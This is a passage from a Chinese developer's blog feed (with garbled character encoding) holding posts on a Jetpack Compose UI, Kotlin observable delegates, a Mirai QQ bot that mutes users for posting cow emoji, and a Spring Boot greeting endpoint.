number">10</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span>                    <span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token function">Text</span><span class="token punctuation">(</span>                            text <span class="token operator">=</span> <span class="token string">"æ”¶è—å¤¹"</span><span class="token punctuation">,</span>                            style <span class="token operator">=</span> <span class="token function">TextStyle</span><span class="token punctuation">(</span>                                fontWeight <span class="token operator">=</span> FontWeight<span class="token punctuation">.</span>Bold<span class="token punctuation">,</span>                                fontSize <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">.</span>sp                            <span class="token punctuation">)</span><span class="token punctuation">,</span>                            modifier <span class="token operator">=</span> Modifier<span class="token punctuation">.</span><span class="token function">padding</span><span class="token punctuation">(</span>bottom <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span>                        <span class="token punctuation">)</span>                        <span class="token function">Text</span><span class="token punctuation">(</span>                            text <span class="token operator">=</span> <span class="token string">"å°†ä»“åº“åŠ å…¥æ”¶è—å¤¹ä»¥ä¾¿éšæ—¶å¿«é€Ÿè®¿é—®ï¼Œè€Œæ— éœ€æœç´¢"</span><span class="token punctuation">,</span>                            style <span class="token operator">=</span> <span class="token function">TextStyle</span><span class="token punctuation">(</span>                                fontSize <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">.</span>sp                            <span class="token punctuation">)</span><span class="token punctuation">,</span>                            modifier <span class="token operator">=</span> Modifier<span class="token punctuation">.</span><span class="token function">padding</span><span class="token punctuation">(</span>top <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span>                        <span class="token punctuation">)</span>                        <span class="token function">Column</span><span class="token punctuation">(</span>                            modifier <span class="token operator">=</span> Modifier                                <span class="token punctuation">.</span><span class="token function">fillMaxWidth</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                                <span class="token punctuation">.</span><span class="token function">padding</span><span class="token punctuation">(</span>top <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span><span class="token punctuation">,</span>                            horizontalAlignment <span class="token operator">=</span> Alignment<span class="token punctuation">.</span>CenterHorizontally                        <span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token function">Card</span><span class="token punctuation">(</span>                                modifier <span class="token operator">=</span> Modifier<span class="token punctuation">.</span><span class="token function">padding</span><span class="token punctuation">(</span>horizontal <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span><span class="token punctuation">,</span>                                shape <span class="token operator">=</span> <span class="token function">RoundedCornerShape</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>                            <span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token function">Button</span><span class="token punctuation">(</span>                                    onClick <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token comment">/*TODO*/</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>                                    elevation <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">,</span>                                    modifier <span class="token operator">=</span> Modifier<span class="token punctuation">.</span><span class="token function">fillMaxWidth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                    shape <span class="token operator">=</span> <span class="token function">RoundedCornerShape</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                    colors <span class="token operator">=</span> ButtonDefaults<span class="token punctuation">.</span><span class="token function">buttonColors</span><span class="token punctuation">(</span>                                        backgroundColor <span class="token operator">=</span> Color<span class="token punctuation">.</span>Transparent                                    <span class="token punctuation">)</span>                                <span class="token punctuation">)</span> <span class="token punctuation">{</span>                                    <span class="token function">Text</span><span class="token punctuation">(</span>                                        text <span class="token operator">=</span> <span class="token string">"æ·»åŠ æ”¶è—"</span><span class="token punctuation">,</span>                                        style <span class="token operator">=</span> <span class="token function">TextStyle</span><span class="token punctuation">(</span>                                            fontSize <span class="token operator">=</span> <span class="token number">14</span><span class="token punctuation">.</span>sp<span class="token punctuation">,</span>                                            color <span class="token operator">=</span> <span class="token function">Color</span><span class="token punctuation">(</span><span class="token number">0xFF229DD5</span><span class="token punctuation">)</span>                                        <span class="token punctuation">)</span><span class="token punctuation">,</span>                                        modifier <span class="token operator">=</span> Modifier<span class="token punctuation">.</span><span class="token function">padding</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span>                                    <span class="token punctuation">)</span>                                <span class="token punctuation">}</span>                            <span class="token punctuation">}</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation builtin">@Composable</span>    <span class="token keyword">fun</span> <span class="token function">WorkSelection</span><span class="token punctuation">(</span>        icon<span class="token operator">:</span> Int<span class="token punctuation">,</span>        text<span class="token operator">:</span> String<span class="token punctuation">,</span>        color<span class="token operator">:</span> Color    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">Row</span><span class="token punctuation">(</span>            Modifier<span class="token punctuation">.</span><span class="token function">padding</span><span class="token punctuation">(</span>vertical <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span><span class="token punctuation">,</span>            verticalAlignment <span class="token operator">=</span> Alignment<span class="token punctuation">.</span>CenterVertically        <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment">// åœ†è§’icon</span>            <span class="token function">Surface</span><span class="token punctuation">(</span>                shape <span class="token operator">=</span> <span class="token function">RoundedCornerShape</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                modifier <span class="token operator">=</span> Modifier<span class="token punctuation">.</span><span class="token function">padding</span><span class="token punctuation">(</span>end <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span>            <span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">Image</span><span class="token punctuation">(</span>                    painter <span class="token operator">=</span> <span class="token function">painterResource</span><span class="token punctuation">(</span>id <span class="token operator">=</span> icon<span class="token punctuation">)</span><span class="token punctuation">,</span>                    contentDescription <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">,</span>                    modifier <span class="token operator">=</span> Modifier                        <span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span>                        <span class="token punctuation">.</span><span class="token function">background</span><span class="token punctuation">(</span>color<span class="token punctuation">)</span><span class="token punctuation">,</span>                    colorFilter <span class="token operator">=</span> ColorFilter<span class="token punctuation">.</span><span class="token function">tint</span><span class="token punctuation">(</span>Color<span class="token punctuation">.</span>White<span class="token punctuation">)</span>                <span class="token punctuation">)</span>            <span class="token punctuation">}</span>            <span class="token function">Text</span><span class="token punctuation">(</span>                text <span class="token operator">=</span> text<span class="token punctuation">,</span>                style <span class="token operator">=</span> <span class="token function">TextStyle</span><span class="token punctuation">(</span>                    fontSize <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">.</span>sp                <span class="token punctuation">)</span>            <span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation builtin">@Preview</span>    <span class="token annotation builtin">@Composable</span>    <span class="token keyword">fun</span> <span class="token function">Preview</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æ•ˆæœ"><a href="#æ•ˆæœ" class="headerlink" title="æ•ˆæœ"></a>æ•ˆæœ</h2><p>æ„Ÿè§‰è¿˜è¡Œï¼Œå­¦ä¹ ä¸€ä¸ŠåˆComposeçš„æˆæœ</p><p><img src="https://gitee.com/coldrain-moro/images_bed/raw/master/images/Screenshot_2021-12-24-22-32-59-446_kim.bifrost.co.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Compose </tag>
            
            <tag> Kotlin </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ©ç”¨Kotlinå§”æ‰˜å¿«æ·çš„åˆ›å»ºå¯è§‚å¯Ÿå±æ€§</title>
      <link href="/2022/09/03/kotlin-delegates-observable/"/>
      <url>/2022/09/03/kotlin-delegates-observable/</url>
      
        <content type="html"><![CDATA[<h1 id="åˆ©ç”¨Kotlinå§”æ‰˜å¿«æ·çš„åˆ›å»ºå¯è§‚å¯Ÿå±æ€§"><a href="#åˆ©ç”¨Kotlinå§”æ‰˜å¿«æ·çš„åˆ›å»ºå¯è§‚å¯Ÿå±æ€§" class="headerlink" title="åˆ©ç”¨Kotlinå§”æ‰˜å¿«æ·çš„åˆ›å»ºå¯è§‚å¯Ÿå±æ€§"></a>åˆ©ç”¨Kotlinå§”æ‰˜å¿«æ·çš„åˆ›å»ºå¯è§‚å¯Ÿå±æ€§</h1><p>åºŸè¯å°‘è¯´ï¼Œä¸Šä»£ç </p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">class</span> User <span class="token punctuation">{</span>    <span class="token keyword">var</span> name<span class="token operator">:</span> String <span class="token keyword">by</span> Delegates<span class="token punctuation">.</span><span class="token function">observable</span><span class="token punctuation">(</span><span class="token string">"åˆå§‹å€¼"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> prop<span class="token punctuation">,</span> old<span class="token punctuation">,</span> new <span class="token operator">-&gt;</span>        <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"æ—§å€¼ï¼š<span class="token interpolation variable">$old</span> -&gt; æ–°å€¼ï¼š<span class="token interpolation variable">$new</span>"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†ä¸åŒäºRxJavaï¼ŒFlowå’ŒLiveDataï¼Œå®ƒåªèƒ½åœ¨å˜é‡å£°æ˜æ—¶æŒ‡å®šè§‚å¯Ÿçš„å›è°ƒå‡½æ•°</p><p>è¿™ä¹Ÿä½¿å¾—å®ƒä¸èƒ½åœ¨åŠŸèƒ½ä¸Šå®Œå…¨å–ä»£æ‰LiveDataï¼ˆæ²¡é”™ï¼Œæˆ‘æ˜¯æ ‡é¢˜å…šï¼‰ï¼Œå°¤å…¶æ˜¯åœ¨MVVMè¿™ç§åˆ†å±‚æ¶æ„çš„æ¶æ„æ¨¡å¼ä¸­</p><p>ä½†è¿™ä¸å¦¨ç¢å®ƒæˆä¸ºLiveDataè¢«æ—¶ä»£æŠ›å¼ƒçš„ç†ç”±ä¹‹ä¸€ï¼Œæ¯•ç«Ÿå®ƒå¯æ˜¯KotlinåŸç”Ÿåº“é‡Œçš„ä¸œè¥¿ã€‚å¦‚æœä¸éœ€è¦åœ¨å˜é‡å£°æ˜ä¹‹åæŒ‡å®šå›è°ƒå‡½æ•°ï¼Œé‚£ä»€ä¹ˆRxJavaï¼ŒFlowéƒ½å¾—é è¾¹ç«™äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> å§”æ‰˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello Worldï¼</title>
      <link href="/2022/09/03/hello-world/"/>
      <url>/2022/09/03/hello-world/</url>
      
        <content type="html"><![CDATA[<h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h1><blockquote><p>äºæ˜¯ä¸‡ç‰©ä¼Šå§‹</p></blockquote><p>è®°äº 2021/11/9 ï¼Œåšå®¢ç”±gitblogè¿ç§»åˆ°hexoï¼Œå®Œæ¯•ã€‚</p><p>ä¹‹åä¼šé™†é™†ç»­ç»­ä¸Šä¼ ä»¥å‰çš„åšæ–‡ï¼Œç„¶åå½»åº•å…³åœä¹‹å‰çš„åšå®¢ã€‚</p><h1 id="Self-Introduction"><a href="#Self-Introduction" class="headerlink" title="Self Introduction"></a>Self Introduction</h1><blockquote><ul><li>å°±è¯»äºCQUPTçš„ä¸€ä½æ™®é€šå¸¦å­¦ç”Ÿ</li><li>Bukkitæ’ä»¶å¼€å‘è€…ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ä¸€ä½åŠå¼ƒå‘çš„MCæœåŠ¡å™¨æœä¸»</li><li>å¸¸ç”¨å¼€å‘è¯­è¨€æ˜¯Kotlinï¼Œè‡ªä»ç”¨äº†Kotlinå°±å›ä¸å»Javaäº†</li><li>ç›®å‰æ˜¯çº¢å²©ç½‘æ ¡ç§»åŠ¨å¼€å‘éƒ¨å®‰å“æ–¹å‘/Webç ”å‘éƒ¨å‰ç«¯æ–¹å‘çš„ä¸€åå­¦å‘˜ ï¼ˆä¸»è¦å‘å±•æ–¹å‘æ˜¯å®‰å“å¼€å‘ï¼‰</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello-Mirai</title>
      <link href="/2022/09/03/hello-mirai/"/>
      <url>/2022/09/03/hello-mirai/</url>
      
        <content type="html"><![CDATA[<h1 id="Hello-Mirai"><a href="#Hello-Mirai" class="headerlink" title="Hello Mirai"></a>Hello Mirai</h1><blockquote><p>Mirai æ˜¯ä¸€æ¬¾ååˆ†ä¼˜ç§€çš„QQæœºå™¨äººæ¡†æ¶</p><p>ç”±äºMiraiæä¾›äº†ä¸€å¥—http-apiçš„åŠŸèƒ½å®ç°</p><p>æˆ‘ä»¬å‡ ä¹å¯ä»¥ä½¿ç”¨ä»»ä½•ä¸€ç§è¯­è¨€å®ç°QQæœºå™¨äºº</p><p>è€Œå…¶æœ¬ä½“é¡¹ç›®æ˜¯ç”±Kotlinå¼€å‘çš„ï¼Œè¿™æ­£å¯¹æˆ‘èƒƒå£ï¼</p></blockquote><h2 id="ç¼˜èµ·"><a href="#ç¼˜èµ·" class="headerlink" title="ç¼˜èµ·"></a>ç¼˜èµ·</h2><blockquote><p>ä¸€å‰¯å¤æ€ªçš„ç‰›ç‰›ä¹‹é£å¸­å·äº†å’±ç¾¤</p></blockquote><p><img src="https://gitee.com/coldrain-moro/images_bed/raw/master/images/QQ%E6%88%AA%E5%9B%BE20211202010933.png" alt="QQæˆªå›¾20211202010933"></p><blockquote><p>æ’‚ä¸‹ç‹ è¯</p></blockquote><p><img src="https://gitee.com/coldrain-moro/images_bed/raw/master/images/QQ%E6%88%AA%E5%9B%BE20211202011010.png" alt="QQæˆªå›¾20211202011010"></p><h2 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">package</span> kim<span class="token punctuation">.</span>bifrost<span class="token punctuation">.</span>rain<span class="token punctuation">.</span>anticowemoji<span class="token keyword">import</span> kotlinx<span class="token punctuation">.</span>coroutines<span class="token punctuation">.</span>delay<span class="token keyword">import</span> kotlinx<span class="token punctuation">.</span>coroutines<span class="token punctuation">.</span>launch<span class="token keyword">import</span> net<span class="token punctuation">.</span>mamoe<span class="token punctuation">.</span>mirai<span class="token punctuation">.</span>console<span class="token punctuation">.</span>plugin<span class="token punctuation">.</span>jvm<span class="token punctuation">.</span>JvmPluginDescription<span class="token keyword">import</span> net<span class="token punctuation">.</span>mamoe<span class="token punctuation">.</span>mirai<span class="token punctuation">.</span>console<span class="token punctuation">.</span>plugin<span class="token punctuation">.</span>jvm<span class="token punctuation">.</span>KotlinPlugin<span class="token keyword">import</span> net<span class="token punctuation">.</span>mamoe<span class="token punctuation">.</span>mirai<span class="token punctuation">.</span>contact<span class="token punctuation">.</span>MemberPermission<span class="token keyword">import</span> net<span class="token punctuation">.</span>mamoe<span class="token punctuation">.</span>mirai<span class="token punctuation">.</span>event<span class="token punctuation">.</span>GlobalEventChannel<span class="token keyword">import</span> net<span class="token punctuation">.</span>mamoe<span class="token punctuation">.</span>mirai<span class="token punctuation">.</span>event<span class="token punctuation">.</span>events<span class="token punctuation">.</span>GroupMessageEvent<span class="token keyword">import</span> net<span class="token punctuation">.</span>mamoe<span class="token punctuation">.</span>mirai<span class="token punctuation">.</span>event<span class="token punctuation">.</span>events<span class="token punctuation">.</span>NudgeEvent<span class="token keyword">import</span> net<span class="token punctuation">.</span>mamoe<span class="token punctuation">.</span>mirai<span class="token punctuation">.</span>message<span class="token punctuation">.</span>code<span class="token punctuation">.</span>MiraiCode<span class="token punctuation">.</span>deserializeMiraiCode<span class="token keyword">import</span> net<span class="token punctuation">.</span>mamoe<span class="token punctuation">.</span>mirai<span class="token punctuation">.</span>message<span class="token punctuation">.</span>data<span class="token punctuation">.</span>MessageSource<span class="token punctuation">.</span>Key<span class="token punctuation">.</span>recall<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>TimeUnit<span class="token keyword">import</span> kotlin<span class="token punctuation">.</span>random<span class="token punctuation">.</span>Random<span class="token comment">/** * kim.bifrost.rain.anticowemoji.AntiCowEmoji * AntiCowEmoji * * @author å¯’é›¨ * @since 2021/12/1 17:11 **/</span><span class="token keyword">object</span> AntiCowEmoji <span class="token operator">:</span> <span class="token function">KotlinPlugin</span><span class="token punctuation">(</span>    <span class="token function">JvmPluginDescription</span><span class="token punctuation">(</span>        id <span class="token operator">=</span> <span class="token string">"kim.bifrost.rain.anticowemoji.AntiCowEmoji"</span><span class="token punctuation">,</span>        version <span class="token operator">=</span> <span class="token string">"1.0.0"</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">name</span><span class="token punctuation">(</span><span class="token string">"AntiCowEmoji"</span><span class="token punctuation">)</span>        <span class="token function">author</span><span class="token punctuation">(</span><span class="token string">"Rain"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">onEnable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// èŠ™å…°æ€çˆ†ç‰›ç‰›äºº</span>        GlobalEventChannel<span class="token punctuation">.</span><span class="token function">parentScope</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>subscribeAlways<span class="token operator">&lt;</span>GroupMessageEvent<span class="token operator">&gt;</span> <span class="token punctuation">{</span> event <span class="token operator">-&gt;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>group<span class="token punctuation">.</span>id <span class="token operator">==</span> <span class="token number">755478639L</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>message<span class="token punctuation">.</span><span class="token function">contentToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"\uD83D\uDC2E"</span><span class="token punctuation">)</span>                    <span class="token operator">||</span> event<span class="token punctuation">.</span>message<span class="token punctuation">.</span><span class="token function">contentToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"\uD83D\uDC02"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>sender<span class="token punctuation">.</span>permission <span class="token operator">&gt;=</span> MemberPermission<span class="token punctuation">.</span>ADMINISTRATOR<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token label symbol">@subscribeAlways</span> let <span class="token punctuation">{</span>                        bot<span class="token punctuation">.</span><span class="token function">getGroup</span><span class="token punctuation">(</span>group<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">.</span><span class="token function">sendMessage</span><span class="token punctuation">(</span><span class="token string">"ç®¡ç†å‘˜ä¹Ÿä¸è®¸ç‰›!!! [mirai:at:<span class="token interpolation"><span class="token delimiter variable">${</span>sender<span class="token punctuation">.</span>id<span class="token delimiter variable">}</span></span>]"</span><span class="token punctuation">.</span><span class="token function">deserializeMiraiCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token punctuation">}</span>                    <span class="token comment">// æ’¤ å› æ¶ˆ æ¯</span>                    message<span class="token punctuation">.</span><span class="token function">recall</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token comment">// æš´ æ”¿ æ‰§ è¡Œ</span>                    sender<span class="token punctuation">.</span><span class="token function">mute</span><span class="token punctuation">(</span>Random<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">180</span><span class="token punctuation">,</span><span class="token number">600</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token comment">// æ¸© æŸ” å‘Š è¯«</span>                    launch <span class="token punctuation">{</span>                        <span class="token function">delay</span><span class="token punctuation">(</span>TimeUnit<span class="token punctuation">.</span>SECONDS<span class="token punctuation">.</span><span class="token function">toMillis</span><span class="token punctuation">(</span><span class="token number">1L</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        subject<span class="token punctuation">.</span><span class="token function">sendMessage</span><span class="token punctuation">(</span><span class="token string">"ä¸è®¸ç‰›!!! [mirai:at:<span class="token interpolation"><span class="token delimiter variable">${</span>sender<span class="token punctuation">.</span>id<span class="token delimiter variable">}</span></span>]"</span><span class="token punctuation">.</span><span class="token function">deserializeMiraiCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment">// æˆ³ä¸€æˆ³å›åº”</span>        GlobalEventChannel<span class="token punctuation">.</span><span class="token function">parentScope</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>subscribeAlways<span class="token operator">&lt;</span>NudgeEvent<span class="token operator">&gt;</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>target<span class="token punctuation">.</span>id <span class="token operator">==</span> bot<span class="token punctuation">.</span>id<span class="token punctuation">)</span> <span class="token punctuation">{</span>                from<span class="token punctuation">.</span><span class="token function">nudge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sendTo</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>subject<span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å®é™…æ•ˆæœ"><a href="#å®é™…æ•ˆæœ" class="headerlink" title="å®é™…æ•ˆæœ"></a>å®é™…æ•ˆæœ</h2><blockquote><p>æ•ˆæœå¾ˆå¥½ï¼Œçº æ­£äº†è¿™è‚¡ä¸æ­£ä¹‹é£</p><p>å¯çˆ±çš„èŠ™å…°ä¹Ÿå˜å¾—æœ‰è¡€æœ‰è‚‰èµ·æ¥</p></blockquote><p><img src="https://gitee.com/coldrain-moro/images_bed/raw/master/images/QQ%E5%9B%BE%E7%89%8720211202011439.png" alt="QQå›¾ç‰‡20211202011439"></p><h2 id="è¸©çš„å‘"><a href="#è¸©çš„å‘" class="headerlink" title="è¸©çš„å‘"></a>è¸©çš„å‘</h2><p>æœ‰æ—¶æœºå™¨äººä¼šçªç„¶å˜å“‘å·´ï¼Œè¿™æ—¶åªéœ€åˆ é™¤botæ–‡ä»¶å¤¹ä¸­çš„cacheå³å¯</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Mirai </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello Spring Boot!</title>
      <link href="/2022/09/03/hello-spring-boot/"/>
      <url>/2022/09/03/hello-spring-boot/</url>
      
        <content type="html"><![CDATA[<h1 id="Hello-Spring-Boot"><a href="#Hello-Spring-Boot" class="headerlink" title="Hello Spring Boot"></a>Hello Spring Boot</h1><p>å…¶å®ä¹‹å‰ä¹Ÿæœ‰äº†è§£è¿‡å…¶ä»–çš„åç«¯å®ç°æ–¹å¼ï¼Œæ¯”å¦‚Goçš„åç«¯ï¼ˆè¿˜æ²¡å­¦åˆ°æ€ä¹ˆå†™æ¥å£å°±æ”¾å¼ƒäº†ï¼‰ï¼ŒNode.jsçš„åç«¯ï¼ˆè¿˜æ˜¯æ•´å¾—ç¨€é‡Œç³Šæ¶‚çš„ï¼‰ï¼Œå‘ç°éƒ½å­¦ä¸å¤ªä¼šã€‚ï¼ˆå…¶å®æ˜¯æ²¡æ—¶é—´å»ä»”ç»†ç¢ç£¨ï¼Œå­¦ä¹ è¿™äº›è¯­è¨€çš„åç«¯åŒæ—¶ä¹Ÿéœ€è¦å­¦ä¹ è¿™äº›è¯­è¨€ï¼Œå­¦ä¹ æˆæœ¬è¾ƒå¤§ï¼‰</p><p>äºæ˜¯æˆ‘è¿˜æ˜¯é€‰æ‹©äº†æœ€ä¼ ç»Ÿçš„Spring Bootåç«¯ã€‚ä¸è¿‡æˆ‘ä½¿ç”¨äº†æˆ‘å–œæ¬¢çš„Kotlinè¯­è¨€æ¥ç¼–å†™ï¼Œä½¿ç”¨Gradleå·¥å…·æ¥ç®¡ç†ä¾èµ–åº“ã€‚</p><p>åˆšä¸Šæ‰‹æ—¶ä¾¿æƒŠè®¶çš„å‘ç°ï¼ŒSpring Bootæ¡†æ¶å¯¹javaåç«¯çš„å°è£…çœŸçš„ç‰¹åˆ«å½»åº•ï¼ŒåŸºæœ¬å°±æ˜¯å‡ ä¸ªæ³¨è§£ä¾¿å¸®ä½ å¤„ç†äº†å¤§éƒ¨åˆ†å·¥ä½œï¼Œå†™èµ·æ¥çœŸçš„ç‰¹åˆ«çš„èˆ’æœã€‚</p><p>åƒè¿™æ ·ä¾¿èƒ½å®ç°ä¸€ä¸ªç®€å•çš„è¿”å›jsonä¿¡æ¯çš„apiæ¥å£</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token annotation builtin">@RestController</span><span class="token keyword">class</span> TestController <span class="token punctuation">{</span>    <span class="token annotation builtin">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/greeting"</span><span class="token punctuation">)</span>    <span class="token keyword">fun</span> <span class="token function">greeting</span><span class="token punctuation">(</span><span class="token annotation builtin">@RequestParam</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"name"</span><span class="token punctuation">,</span> defaultValue <span class="token operator">=</span> <span class="token string">"World"</span><span class="token punctuation">)</span> name<span class="token operator">:</span> String<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">BaseResponseBean</span><span class="token punctuation">(</span><span class="token string">"Hello <span class="token interpolation variable">$name</span>"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">data</span> <span class="token keyword">class</span> BaseResponseBean<span class="token operator">&lt;</span>T<span class="token operator">&gt;</span><span class="token punctuation">(</span>    <span class="token keyword">val</span> <span class="token keyword">data</span><span class="token operator">:</span> T<span class="token operator">?</span><span class="token punctuation">,</span>    <span class="token keyword">val</span> errorCode<span class="token operator">:</span> Int <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token 